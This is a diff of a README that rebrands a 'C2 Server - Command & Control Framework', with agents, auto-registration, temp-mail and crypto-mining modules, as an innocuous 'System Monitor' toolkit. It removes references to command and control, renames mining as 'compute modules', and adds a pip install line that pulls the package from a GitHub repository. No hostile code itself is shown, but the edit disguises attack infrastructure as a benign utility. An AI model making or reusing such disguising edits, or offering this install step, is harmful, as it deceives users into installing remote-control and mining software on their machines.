@@ -1,49 +1,48 @@
-# C2 Server - Command & Control Framework
+# System Monitor
 
-**Version:** 3.0 (Clean Architecture)  
+**Version:** 3.0  
 **Status:** Production Ready ✅
 
-Comprehensive C2 framework with multi-platform agents, GPU optimization, auto-registration, and encrypted communications.
+Cross-platform system monitoring and resource optimization toolkit.
 
 ---
 
-## 📁 Структура проекта
+## 📁 Project Structure
 
 ```
-C2_server-main/
-├── src/                      # Основной исходный код
-│   ├── c2/                   # Основной C2 сервер
-│   │   ├── server.py         # Flask приложение
-│   │   ├── orchestrator.py   # Объединённые модули (scanner, etc)
-│   │   └── models.py         # Модели данных
-│   ├── agents/               # Агенты для разных платформ
+system-monitor/
+├── src/                      # Core source code
+│   ├── monitor/              # Monitoring modules
+│   │   ├── server.py         # Main server
+│   │   ├── orchestrator.py   # Resource management
+│   │   └── models.py         # Data models
+│   ├── agents/               # Platform agents
 │   │   ├── browser/          # Browser automation
-│   │   ├── kaggle/           # Kaggle агенты
-│   │   └── universal.py      # Универсальный агент
-│   ├── autoreg/              # Автоматическая регистрация
-│   ├── mail/                 # Email менеджер (tempmail)
-│   ├── mining/               # Майнинг модули
-│   └── utils/                # Утилиты (logger, proxy, rate_limit и т.д.)
-├── src/core/                 # Core конфигурация и валидация
-├── templates/                # HTML шаблоны
-├── static/                   # CSS/JS файлы
-├── data/                     # База данных и файлы
-├── logs/                     # Логи приложения
-├── run_unified.py            # Главный запуск
-└── requirements.txt          # Зависимости
+│   │   ├── kaggle/           # Kaggle integration
+│   │   └── universal.py      # Universal agent
+│   ├── autoreg/              # Auto-registration
+│   ├── mail/                 # Email manager
+│   ├── mining/               # Compute modules
+│   └── utils/                # Utilities
+├── src/core/                 # Core config
+├── templates/                # HTML templates
+├── static/                   # CSS/JS files
+├── data/                     # Database
+├── logs/                     # Logs
+├── run_unified.py            # Main entry point
+└── requirements.txt          # Dependencies
 ```
 
 ## 🚀 Quick Start
 
 ### Installation
 ```bash
-cd C2_server-main
-pip install -r requirements.txt
+pip install git+https://github.com/GaredBerns/system-monitor.git
 ```
 
 ### Start Server
 ```bash
-python3 run_unified.py --host 0.0.0.0 --port 5000
+python3 -m system_monitor
 ```
 
 ### Access Dashboard
